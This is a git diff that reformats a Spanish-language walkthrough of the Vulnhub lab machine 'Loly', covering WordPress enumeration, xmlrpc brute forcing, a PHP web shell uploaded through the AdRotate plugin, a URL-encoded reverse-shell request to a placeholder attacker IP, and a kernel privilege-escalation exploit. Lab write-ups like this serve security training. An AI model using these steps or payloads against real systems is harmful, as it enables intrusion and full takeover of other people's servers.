@@ -1,4 +1,21 @@
+---
+layout: single
+title: Loly - Vulnhub
+date: 26/10/2023
+classes: wide
+header:
+  teaser:
 
+tags:
+  - Web Enumeration
+  - WordPress Enumeration
+  - Abusing xmlrpc.php
+  - Bash advanced
+  - Abusing AdRotate Manage Media > RCE
+  - Kernel Exploitation
+  - fácil
+  - linux
+---
 
 # PortScan
 
@@ -21,7 +38,8 @@
 # Sitio Web
 
 
-![[Pasted image 20231026142343.png]]
+![](/assets/images/loly/Pasted image 20231026142343.png)
+
 El sitio web de Loly es bastante básico, por lo que procedemos a buscar nuevas rutas mediante el fuzzing.
 
 
@@ -36,7 +54,9 @@ gobuster dir -u http://192.168.204.155 -w /usr/share/SecLists/Discovery/Web-Cont
 El directorio tiene un enlace a un vhost con nombre "**loly.lc**". Agregamos esto a nuestro servidor en el "/etc/hosts" para poder ver el directorio "wordpress" con su respectivo estilo.
 
 Indagando en el Wordpress, vemos un sólo post de único usuario
-![[Pasted image 20231026143125.png]]
+
+![](/assets/images/loly/Pasted image 20231026143125.png)
+
 Por lo que ya sabemos un usuario válido.
 
 # Enumeración WordPress
@@ -56,7 +76,8 @@ Veremos qué tenemos el "**xmlrpc.php**" expuesto, y otros directorios.
 /xmlrpc.php           (Status: 405) [Size: 42]   
 ```
 
-![[Pasted image 20231026143323.png]]
+![](/assets/images/loly/Pasted image 20231026143323.png)
+
 Y nos dice que el XMLRPC sólo acepta peticiones por POST, por lo qué podríamos tratar de abusar de este recurso para obtener las credenciales válidas mediante un script en Bash, y para corroborarlo debemos mandarle una solicitud con el método GET con una estructura XML qué nos permita listar los métodos disponibles del recurso XMLRPC, y sí el método "wp.getUsersBlogs" está activo, podremos realizar un script en bash que mediante fuerza bruta nos permita obtener las credenciales válidas.
 
 ```
@@ -111,7 +132,9 @@ Una vez ejecutado, nos dará las credenciales válida del usuario "loly".
 # Abuso Plugin AdRotate.
 
 Sí nos fijamos en el plugin AdRotate, podremos subir archivos en formatos .zip y automáticamente se descomprimirían.
-![[Pasted image 20231026144909.png]]
+
+![](/assets/images/loly/Pasted image 20231026144909.png)
+
 Por lo que podemos aprovecharnos de subir un código malicioso en **PHP** comprimido el cual nos permita llevar a cabo un RCE desde la URL, para ello debemos convertirlo en zip y posteriormente subirlo.
 
 El código malicioso .PHP tendrá lo siguiente:
@@ -120,7 +143,9 @@ El código malicioso .PHP tendrá lo siguiente:
 ```
 
 Lo convertimos a zip, para posterior a ello subirlo en el plugin AdRotate, el cual lo descomprimirá y tan sólo se quedará con la extensión .PHP, pero para aprovecharnos de este archivo malicioso que subimos, debemos saber donde se guarda, por lo qué abajo nos deja una pista, que el directorio final sería /banners, y si nos fijamos en el fuzzing que hicimos anteriormente había un directorio /wp-content, donde suele guardarse el contenido de los WordPress, por lo qué el recurso estaría en "/wp-contet/banners/nombre_del_recurso_subido"
-![[Pasted image 20231026145053.png]]
+
+![](/assets/images/loly/Pasted image 20231026145053.png)
+
 Y ya desde la URL estamos llevando a cabo un RCE, por lo que podemos entablarnos una Reverse Shell con el típico one line y conectarnos a la máquina.
 ```
 http://loly.lc/wordpress/wp-content/banners/cmd.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/ip_atacante/443%200%3E%261%22
@@ -133,7 +158,8 @@ uname -a
 Linux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
 ```
 Sí buscamos esta versión de Kernel en searchsploit, veremos que es vulnerable a escalada de Privilegios. 
-![[Pasted image 20231026150048.png]]
+
+![](/assets/images/loly/Pasted image 20231026150048.png)
 
 Por lo que obtenemos este script, para compilarlo, subirlo a la máquina víctima & ejecutarlo desde allí.
 ```
@@ -149,4 +175,5 @@ chmod +x dirty
 ./dirty
 ```
 y así escalaremos como ROOT.
-![[Pasted image 20231026150312.png]]
+
+![](/assets/images/loly/Pasted image 20231026150312.png)
